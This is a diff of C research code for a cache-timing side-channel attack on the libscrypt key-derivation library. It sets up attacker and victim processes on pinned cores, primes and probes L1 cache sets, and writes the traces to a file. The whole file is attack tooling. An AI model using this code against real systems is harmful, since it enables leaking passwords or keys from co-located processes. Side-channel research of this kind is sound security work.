@@ -17,8 +17,13 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
 #include "rdtsc.h"
 #include "libscrypt.h"
+#include "mysem.h"
+
+#define SHMSZ 10
 
 void print_res(FILE* fp, uint16_t* res, int* rmap, int nsets){
 	int i = 0;
@@ -43,15 +48,7 @@ void print_hex(const char *s)
   printf("\n");
 }
 
-int main(){
-    char buff[64];
-
-    int i,j;
-    int fd = open("./libscrypt.so", O_RDONLY);
-    if(fd == -1){
-        perror("Can't open the file, please check\n");
-        return 0;
-    }
+char* libraryStarting(int fd){
     size_t size = lseek(fd, 0, SEEK_END);
     if(size == 0)
         exit(-1);
@@ -60,14 +57,45 @@ int main(){
       map_size |= 0xFFF;
       map_size += 1;
     }
-    char* base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+    return (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+}
+
+int main(int argv, char *argc[]){
+    char buff[64];
+
+    int i,j;
+    int fd = open("./libscrypt.so", O_RDONLY);
+    if(fd == -1){
+        perror("Can't open the file, please check\n");
+        return 1;
+    }
+    char* base = libraryStarting(fd);
 
     cpu_set_t mask;
     CPU_ZERO(&mask);
-    CPU_SET(1, &mask);
+    CPU_SET(2, &mask);
 
     if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
         perror("some error occurred while setting the affinity.\n");
+
+    //shared memory
+    key_t key;
+    key = 4567;
+    int shmid;
+    volatile char *sync;
+
+    if ((shmid = shmget(key, SHMSZ, IPC_CREAT | 0666)) < 0) {
+        perror("shmget");
+        exit(1);
+    }
+
+    sync = shmat(shmid, NULL, 0);
+    if(sync == (char*)-1){
+        perror("error with shared memory.\n");
+        return 1;
+    }
+
+    *sync = 0;
 
     pid_t attacker = getpid();
     printf("attacker id: %d\n", attacker);
@@ -76,12 +104,12 @@ int main(){
 
         cpu_set_t mask;
         CPU_ZERO(&mask);
-        CPU_SET(5, &mask);
+        CPU_SET(6, &mask);
 
         if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
             perror("some error occurred while setting the affinity.\n");
         uint64_t a = rdtsc();
-        libscrypt_scrypt((uint8_t*)"4Lex3s8O2zfNgBqH", 16, (uint8_t*)"NaCl", 4, 1024, 8, 16, (uint8_t*)buff, 64);
+        libscrypt_scrypt((uint8_t*)argc[1], 16, (uint8_t*)"NaCl", 4, 1024, 8, 1, (uint8_t*)buff, 64);
         printf("%llu\n", rdtsc()-a);
         exit(0);
         /* print_hex(buff); */
@@ -90,7 +118,7 @@ int main(){
         printf("victim id: %d\n", childid);
         int cid =fork();
         if(cid == 0){ //amplifier
-
+            exit(0);
 
             cpu_set_t mask;
             CPU_ZERO(&mask);
@@ -108,25 +136,6 @@ int main(){
                 uint64_t offset = addresses[i] + base;
                 addresses[i] = offset;
             }
-
-            sem_t *namedSemaphore, *unamedSemaphore;
-            if ((namedSemaphore = sem_open("psem", O_CREAT, 0666, 0)) == SEM_FAILED){
-                perror("named semaphore initialization error");
-                return 0;
-            }
-            if ((unamedSemaphore = sem_open("usem", O_CREAT, 0666, 0)) == SEM_FAILED){
-                perror("named semaphore initialization error");
-                return 0;
-            }
-
-            sem_wait(namedSemaphore);
-            sem_post(unamedSemaphore);
-
-            sem_close(namedSemaphore);
-            sem_close(unamedSemaphore);
-
-            sem_unlink("psem");
-            sem_unlink("usem");
 
             int j = 0;
             uint64_t a = rdtsc();
@@ -163,53 +172,41 @@ int main(){
                 rmap[map[i]] = i;
 
             /* uint16_t *res = calloc(1*64, sizeof(uint16_t)); */
-            uint16_t res[64];
+            uint16_t res[no_of_rounds][64];
             for(i=0; i<no_of_rounds; i++)
                 for(j=0; j<64; j++)
-                    res[j] = 0;
+                    res[i][j] = 0;
             /* for (i = 0; i < 1 * 64; i+= 4096/sizeof(uint16_t)) */
             /*     res[i] = 0; */
 
             FILE *fp = fopen("cache_traces.txt","w");
             delayloop(3000000000U);
 
-
-            sem_t *abarrierSemaphore, *bbarrierSemaphore;
-            if ((abarrierSemaphore = sem_open("arr", O_CREAT, 0666, 0)) == SEM_FAILED){
-                perror("named semaphore initialization error");
-                return 0;
-            }
-            if ((bbarrierSemaphore = sem_open("brr", O_CREAT, 0666, 0)) == SEM_FAILED){
-                perror("named semaphore initialization error");
-                return 0;
-            }
-
-            sem_wait(abarrierSemaphore);
-            for(i=0; i<3; i++)
-                l1_bprobe(l1, res);
-            sem_post(bbarrierSemaphore);
+            for(i=0; i<no_of_rounds; i++)
+                l1_bprobe(l1, res[i]);
 
 
             k = 0;
+            wait_master(sync);
+                l1_probe(l1, res[k]);
+            notify_master(sync);
             while(k<no_of_rounds){
-                sem_wait(abarrierSemaphore);
-                    l1_probe(l1, res);
+                /* wait_master(sync); */
+                /*     l1_probe(l1, res[k]); */
+                /* notify_master(sync); */
+
                     /* printf("client: %d\n",k); */
-                sem_post(bbarrierSemaphore);
+                wait_master(sync);
+                if(k%2==0)
+                    l1_bprobe(l1, res[k]);
+                else
+                    l1_probe(l1, res[k]);
 
-                sem_wait(abarrierSemaphore);
-                    l1_bprobe(l1, res);
-                sem_post(bbarrierSemaphore);
-
-                print_res(fp, res, rmap, nsets);
+                notify_master(sync);
                 k++;
             }
-            sem_close(abarrierSemaphore);
-            sem_close(bbarrierSemaphore);
-
-            sem_unlink("arr");
-            sem_unlink("brr");
-
+            for(i=0; i<no_of_rounds; i++)
+                print_res(fp, res[i], rmap, nsets);
 
             fclose(fp);
         }
